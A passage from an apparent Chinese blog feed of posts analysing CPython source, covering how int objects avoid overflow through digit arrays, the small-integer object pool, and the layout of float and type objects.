a-&gt;ob_digit[i] == b-&gt;ob_digit[i])</span><br><span class="line">            ;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> (PyLongObject *)PyLong_FromLong(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (a-&gt;ob_digit[i] &lt; b-&gt;ob_digit[i]) &#123;</span><br><span class="line">            sign = <span class="number">-1</span>;</span><br><span class="line">            &#123; PyLongObject *temp = a; a = b; b = temp; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        size_a = size_b = i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    z = _PyLong_New(size_a);</span><br><span class="line">    <span class="keyword">if</span> (z == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size_b; ++i) &#123;</span><br><span class="line">        <span class="comment">/* The following assumes unsigned arithmetic</span></span><br><span class="line"><span class="comment">           works module 2**N for some N&gt;PyLong_SHIFT. */</span></span><br><span class="line">        borrow = a-&gt;ob_digit[i] - b-&gt;ob_digit[i] - borrow;</span><br><span class="line">        z-&gt;ob_digit[i] = borrow &amp; PyLong_MASK;</span><br><span class="line">        borrow &gt;&gt;= PyLong_SHIFT;</span><br><span class="line">        borrow &amp;= <span class="number">1</span>; <span class="comment">/* Keep only one sign bit */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; size_a; ++i) &#123;</span><br><span class="line">        borrow = a-&gt;ob_digit[i] - borrow;</span><br><span class="line">        z-&gt;ob_digit[i] = borrow &amp; PyLong_MASK;</span><br><span class="line">        borrow &gt;&gt;= PyLong_SHIFT;</span><br><span class="line">        borrow &amp;= <span class="number">1</span>; <span class="comment">/* Keep only one sign bit */</span></span><br><span class="line">    &#125;</span><br><span class="line">    assert(borrow == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sign &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        Py_SIZE(z) = -Py_SIZE(z);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> long_normalize(z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过<code>x_add</code>，相信读者已经可以开始自己尝试分析<code>x_sub</code>了。</p>]]></content>
      
      
      <categories>
          
          <category> 源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python源码剖析 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python源码剖析No.4--永不溢出的int对象</title>
      <link href="/2022/05/16/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B0%B8%E4%B8%8D%E6%BA%A2%E5%87%BA%E7%9A%84int%E5%AF%B9%E8%B1%A1/"/>
      <url>/2022/05/16/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B0%B8%E4%B8%8D%E6%BA%A2%E5%87%BA%E7%9A%84int%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">1000000000000000000000</span>;</span><br><span class="line">print(i);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述C代码在运行会报错，这是由于C语言的int整型位数位32bit，表示范围有限<code>32 位的有符号整数_C++中整数的范围(-2^31 ~ 2^31-1,-2147483648~2147483647)</code>，显然上述代码超出了这个表示范围，因此报错。</p><p>相比之下python中却不会出现上述的问题，并且能够正常表示数值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">10000000000000000000000000000000000000000</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------output-------------#</span></span><br><span class="line"><span class="number">10000000000000000000000000000000000000000</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>更夸张的例子，计算10的100次方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">10</span>**<span class="number">1000</span>)</span><br><span class="line"><span class="comment">#----------output--------------#</span></span><br><span class="line"><span class="number">10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure><p>为什么python能做到这一点呢？ 这是本节探讨的主题：int对象，永不溢出的整数。</p><br><h3 id="PyLongObject"><a href="#PyLongObject" class="headerlink" title="PyLongObject"></a>PyLongObject</h3><p>为了解答上述问题，我们需要从python中int类型对象的设计出发：</p><p>python中int对象<code>PyLongObject</code>定义位置：&#x2F;objects&#x2F;longobject.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">longobject</span> <span class="title">PyLongObject</span>;</span> <span class="comment">/* Revealed in longintrepr.h */</span></span><br></pre></td></tr></table></figure><p>跟踪 <code>_longobject</code>来到&#x2F;include&#x2F;intrepr.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">longobject</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    digit ob_digit[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到整型对象<code>PyLongObject</code>根据其对象头部<code>PyObject_VAR_HEAD</code>可以看到是属于<strong>变长对象</strong>，其次<code>PyLongObject</code>的值是由数组存放的<code>digit ob_digit[1]</code>显然到这里会好奇<code>digit</code>究竟是什么，结果同文件下发现定义，这里只关注相关内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> PYLONG_BITS_IN_DIGIT == 30</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> digit;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> PYLONG_BITS_IN_DIGIT == 15</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> digit;</span><br></pre></td></tr></table></figure><p>从源码得知<code>digit</code>就是一个C语言无符号整数，只是根据位数不同声明的长度不同而已，编译python解析器时可以通过相关宏定义<code>PYLONG_BITS_IN_DIGIT</code>与<code>PYLONG_BITS_IN_DIGIT</code>来选择使用的<code>digit</code>版本，但默认使用<code>PYLONG_BITS_IN_DIGIT == 30</code>，指示<code>digit</code>数组的长度</p><p><strong>至此，我们得知了python利用整型数组来实现更大整数的表示与运算的</strong></p><br><p>这里我们假设<code>digit</code>的元素个数由n，那么python中的int整型对象的布局大致如下：</p><img src="/2022/05/16/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B0%B8%E4%B8%8D%E6%BA%A2%E5%87%BA%E7%9A%84int%E5%AF%B9%E8%B1%A1/1.png" class=""><hr><h3 id="大整数的布局"><a href="#大整数的布局" class="headerlink" title="大整数的布局"></a>大整数的布局</h3><p>大整数分为<code>正数</code>、<code>负数</code> 、<code>零</code>，python据此规定不同整数在int对象中的存储方式，总结有以下三点：</p><ol><li>整数<code>绝对值</code>根据值的大小具体情况分为若干部分，保存于<code>ob_digit</code>数组中</li><li><code>ob_digit</code>数组长度保存于<code>PyVarObject.ob_size</code>字段中，对于负整数的情况，<code>PyVarObject.ob_size</code>为负，即<code>ob_size</code>字段不仅表示需要几个数组元素存放int值的绝对值，还表示正负</li><li>整数<code>0</code>以<code>PyVarObject.ob_size</code>&#x3D;0来表示，<code>ob_digit</code>数组为空</li></ol><br><h4 id="实例说明："><a href="#实例说明：" class="headerlink" title="实例说明："></a>实例说明：</h4><img src="/2022/05/16/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B0%B8%E4%B8%8D%E6%BA%A2%E5%87%BA%E7%9A%84int%E5%AF%B9%E8%B1%A1/2.png" class=""><p><code>2 ** 30</code>是由于上文提到的宏定义<code>PYLONG_BITS_IN_DIGIT</code>相关，为什么不32bit全都使用呢？</p><p>这一点其实跟<code>加法进位</code>有关。如果使用全32位用来保存绝对值，那么为了保证加法不溢出（因为加法可能产生进位），需要先强转32位类型为64位，然后进行计算。但牺牲最高1位之后，加法运算便不用担心加法溢出了。</p><p>那么为什么多牺牲1位的空间呢？</p><p>专栏主认为是为了和digit 只有16位的情况整合起来，当digit数组位数有16位，则python使用15位。下面是我自己的示意图（个人理解）</p><img src="/2022/05/16/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B0%B8%E4%B8%8D%E6%BA%A2%E5%87%BA%E7%9A%84int%E5%AF%B9%E8%B1%A1/3.png" class=""><br><h3 id="小整数静态对象池"><a href="#小整数静态对象池" class="headerlink" title="小整数静态对象池"></a>小整数静态对象池</h3><p>前面学习过python对对象进行了分类，分为：<code>变长对象 &amp; 定长对象</code>、<code>可变对象 &amp; 不可变对象</code></p><p>前面对<code>变长对象 定长对象</code>讨论的比较多，可能有的读者都忘记了<code>可变对象 &amp; 不可变对象</code>的类别了，这里重复一下：</p><ul><li><p><code>不可变对象</code>，对象在完成初始化后不可做值的修改，强行变动会改变变量名的指向对象。以本节说明的int对象为例，它就是不可变对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line">a += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"><span class="comment">#---------------output---------------#</span></span><br><span class="line"><span class="number">4402723168</span></span><br><span class="line"><span class="number">4402723200</span></span><br></pre></td></tr></table></figure><p>可以看到，对不可变对象做修改，会导致变量名指向的对象发生变化</p></li><li><p><code>可变对象</code>，以list为例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(l))</span><br><span class="line">l.append(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(l))</span><br><span class="line"><span class="comment">#---------------output---------------#</span></span><br><span class="line"><span class="number">140253038051904</span></span><br><span class="line"><span class="number">140253038051904</span></span><br></pre></td></tr></table></figure><p>对可变对象做修改，会导致变量名指向的对象不发生变化</p></li></ul><p>显然对于这类操作是相当频繁的，这会给运行带来极大的开销（一旦不可变对象发生变动，则需要进行新对象的创建，使相对应的变量名指向新的对象，旧的对象若没有被引用还涉及旧对象的销毁！）</p><p>那么Python为啥做这种不明智的设计呢？这就不得不提 —- 小整数静态对象池</p><br><p>这是python为解决上述提到的缺陷的方案：预先将常用的整数对象创建好，以备使用，这就是小整数对象池，很简单对吧！相关代码（位置&#x2F;Objects&#x2F;longobject.c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NSMALLPOSINTS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLPOSINTS           257</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NSMALLNEGINTS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLNEGINTS           5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li><code>NSMALLPOSINTS</code>宏规定了对象池正整数个数（包括0），个数&#x3D;257</li><li><code>NSMALLNEGINTS</code>宏规定了对象池负整数个数，个数 &#x3D; 5</li></ul><p>按照默认配置，python启动后静态创建一个包含262个元素的整数数组并一次<code>初始化为负数集合[-5,-1]，[0]以及[1，256]</code>。<a href="https://stackoverflow.com/questions/44787980/python-macros-nsmallposints-vs-nsmallnegints/44855401#44855401">相关文章</a></p><blockquote><p>It turns out Python keeps an array of integer objects for “all integers between -5 and 256”. When we create an int in that range, <strong>we’re actually just getting a reference to the existing object in memory.</strong></p><p>If we set x &#x3D; 42, we are actually performing a search in the integer block for the value in the range -5 to +257. Once x falls out of the scope of this range, it will be garbage collected (destroyed) and be an entirely different object. The process of creating a new integer object and then destroying it immediately creates a lot of useless calculation cycles, so Python preallocated a range of commonly used integers.</p></blockquote><br><h3 id="精彩面试题"><a href="#精彩面试题" class="headerlink" title="精彩面试题"></a>精彩面试题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span>-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a),<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">id</span>(b))</span><br><span class="line"><span class="comment">#-----------------output-------------#</span></span><br><span class="line"><span class="number">4402723168</span> </span><br><span class="line"><span class="number">4402723168</span></span><br></pre></td></tr></table></figure><p>其实a, b指向的都是小整数静态对象池中的对象。</p><br><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><ul><li>python的整数对象是<code>变长 &amp; 不可变对象 </code> 能够串联多个C整数类型，实现大整数表示。整数对象的关键字段包括存放对象绝对值的<code>ob_digit</code>数组，存放串联个数以及符号的<code>ob_size</code> </li><li>整数绝对值根据<code>PYLONG_BITS_IN_DIGIT</code>指定的<code>ob_digit</code>的数组元素长度进行存放</li><li>整数0，digit数组为空，ob_size字段为0</li><li>另外，小整数缓冲池优化了<code>不可变对象</code>所带来开销大的问题</li></ul>]]></content>
      
      
      <categories>
          
          <category> 源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python源码剖析 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python源码剖析No.3--浮点对象</title>
      <link href="/2022/05/14/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B5%AE%E7%82%B9%E5%AF%B9%E8%B1%A1/"/>
      <url>/2022/05/14/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B5%AE%E7%82%B9%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cvjark.github.io/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/#PyObject%EF%BC%8C%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%9F%BA%E7%9F%B3">前面的章节</a>中，我们提到了python中的<code>float</code>对象是<strong>定长对象</strong>，那其内部又是怎么布局的呢？这节从源码的角度深入探究一下python中的浮点对象</p><br><p>在往下学习之前，有必要在提一下定长对象的头部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> &#123;</span></span><br><span class="line">    _PyObject_HEAD_EXTRA<span class="comment">//一般用不到</span></span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">ob_type</span>;</span></span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure><p>其中<code>_PyObject_HEAD_EXTRA</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Define pointers to support a doubly-linked list of all live heap objects. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PyObject_HEAD_EXTRA            \</span></span><br><span class="line"><span class="meta">    struct _object *_ob_next;           \</span></span><br><span class="line"><span class="meta">    struct _object *_ob_prev;</span></span><br></pre></td></tr></table></figure><blockquote><p>_PyObject_HEAD_EXTRA是个宏定义，<strong>这些字段仅在定义宏 Py_TRACE_REFS 时存在</strong>。它们被初始化为 NULL 由 PyObject_HEAD_INIT 宏来处理。<strong>对于静态分配的对象，这些字段始终保持 NULL。对于动态分配的对象，这两个字段用于将对象链接到堆上的 all 活对象的双向链表中。</strong>这可以用于各种调试目的；目前唯一的用途是在设置环境变量 PYTHONDUMPREFS 时打印在运行结束时仍然活动的对象。</p><p>这些字段不会由子类型继承。</p></blockquote><p><code>ob_refcnt</code>引用计数</p><p><code>ob_type</code>指向对象类型的基类，是一个指向结构体<code>_typeobject</code> 的指针，关于结构体<code>_typeobject</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *tp_name; <span class="comment">/* For printing, in format &quot;&lt;module&gt;.&lt;name&gt;&quot; */</span></span><br><span class="line">    Py_ssize_t tp_basicsize, tp_itemsize; <span class="comment">/* For allocation */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Methods to implement standard operations */</span></span><br><span class="line"></span><br><span class="line">    destructor tp_dealloc;</span><br><span class="line">    printfunc tp_print;</span><br><span class="line">    getattrfunc tp_getattr;</span><br><span class="line">    setattrfunc tp_setattr;</span><br><span class="line">    PyAsyncMethods *tp_as_async; <span class="comment">/* formerly known as tp_compare (Python 2)</span></span><br><span class="line"><span class="comment">                                    or tp_reserved (Python 3) */</span></span><br><span class="line">    reprfunc tp_repr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Method suites for standard classes */</span></span><br><span class="line"></span><br><span class="line">    PyNumberMethods *tp_as_number;</span><br><span class="line">    PySequenceMethods *tp_as_sequence;</span><br><span class="line">    PyMappingMethods *tp_as_mapping;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* More standard operations (here for binary compatibility) */</span></span><br><span class="line"></span><br><span class="line">    hashfunc tp_hash;</span><br><span class="line">    ternaryfunc tp_call;</span><br><span class="line">    reprfunc tp_str;</span><br><span class="line">    getattrofunc tp_getattro;</span><br><span class="line">    setattrofunc tp_setattro;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Functions to access object as input/output buffer */</span></span><br><span class="line">    PyBufferProcs *tp_as_buffer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags to define presence of optional/expanded features */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> tp_flags;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *tp_doc; <span class="comment">/* Documentation string */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* call function for all accessible objects */</span></span><br><span class="line">    traverseproc tp_traverse;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* delete references to contained objects */</span></span><br><span class="line">    inquiry tp_clear;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* rich comparisons */</span></span><br><span class="line">    richcmpfunc tp_richcompare;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* weak reference enabler */</span></span><br><span class="line">    Py_ssize_t tp_weaklistoffset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Iterators */</span></span><br><span class="line">    getiterfunc tp_iter;</span><br><span class="line">    iternextfunc tp_iternext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Attribute descriptor and subclassing stuff */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PyMethodDef</span> *<span class="title">tp_methods</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PyMemberDef</span> *<span class="title">tp_members</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PyGetSetDef</span> *<span class="title">tp_getset</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">tp_base</span>;</span></span><br><span class="line">    PyObject *tp_dict;</span><br><span class="line">    descrgetfunc tp_descr_get;</span><br><span class="line">    descrsetfunc tp_descr_set;</span><br><span class="line">    Py_ssize_t tp_dictoffset;</span><br><span class="line">    initproc tp_init;</span><br><span class="line">    allocfunc tp_alloc;</span><br><span class="line">    newfunc tp_new;</span><br><span class="line">    freefunc tp_free; <span class="comment">/* Low-level free-memory routine */</span></span><br><span class="line">    inquiry tp_is_gc; <span class="comment">/* For PyObject_IS_GC */</span></span><br><span class="line">    PyObject *tp_bases;</span><br><span class="line">    PyObject *tp_mro; <span class="comment">/* method resolution order */</span></span><br><span class="line">    PyObject *tp_cache;</span><br><span class="line">    PyObject *tp_subclasses;</span><br><span class="line">    PyObject *tp_weaklist;</span><br><span class="line">    destructor tp_del;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Type attribute cache version tag. Added in version 2.6 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_version_tag;</span><br><span class="line"></span><br><span class="line">    destructor tp_finalize;</span><br><span class="line"></span><br><span class="line">&#125; PyTypeObject;</span><br></pre></td></tr></table></figure><p>以上部分是float对象的头部，稍微提一下一些重点字段的含义，因为后续会不断出现雷同的字段，反复加强印象用：</p><ul><li>从<code>PyObject_VAR_HEAD</code>，可以知道所有类型对象的基类<code>PyTypeObject</code>是一个变长对象.</li><li><code>tp_name</code>适用于输出打印出对象类型而设置的</li><li><code>tp_basicsize, tp_itemsize</code>用于对象的内存分配设置的</li></ul><br><hr><h4 id="float对象"><a href="#float对象" class="headerlink" title="float对象"></a>float对象</h4><p>实际上有float类型对象实例化出来的实例对象为<code>PyFloatObject</code> 定义位置&#x2F;include&#x2F;floatobject.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> Py_LIMITED_API</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    <span class="type">double</span> ob_fval;</span><br><span class="line">&#125; PyFloatObject;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>可以看到相比头部对了个存放浮点数值的<code>ob_fval</code></p><img src="/2022/05/14/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B5%AE%E7%82%B9%E5%AF%B9%E8%B1%A1/1.png" class=""><p>那么问题来了，究其背后，float是对象，属于类型对象，又该是什么样子呢？通过前面的学习，我们知道<strong>float类型对象影响着float实例对象的内存分配以及可进行的操作</strong>，具体又是如何一个过程呢？下面我们展开。</p><br><h4 id="float类型对象"><a href="#float类型对象" class="headerlink" title="float类型对象"></a>float类型对象</h4><p>float类型对象<code>PyFloat_Type</code>的定义位置&#x2F;Objects&#x2F;floatobject.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">PyTypeObject PyFloat_Type = &#123;</span><br><span class="line">    PyVarObject_HEAD_INIT(&amp;PyType_Type, <span class="number">0</span>)</span><br><span class="line">    <span class="string">&quot;float&quot;</span>,</span><br><span class="line">    <span class="keyword">sizeof</span>(PyFloatObject),</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (destructor)float_dealloc,                  <span class="comment">/* tp_dealloc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_print */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_getattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_reserved */</span></span><br><span class="line">    (reprfunc)float_repr,                       <span class="comment">/* tp_repr */</span></span><br><span class="line">    &amp;float_as_number,                           <span class="comment">/* tp_as_number */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_sequence */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_mapping */</span></span><br><span class="line">    (hashfunc)float_hash,                       <span class="comment">/* tp_hash */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_call */</span></span><br><span class="line">    (reprfunc)float_repr,                       <span class="comment">/* tp_str */</span></span><br><span class="line">    PyObject_GenericGetAttr,                    <span class="comment">/* tp_getattro */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattro */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_buffer 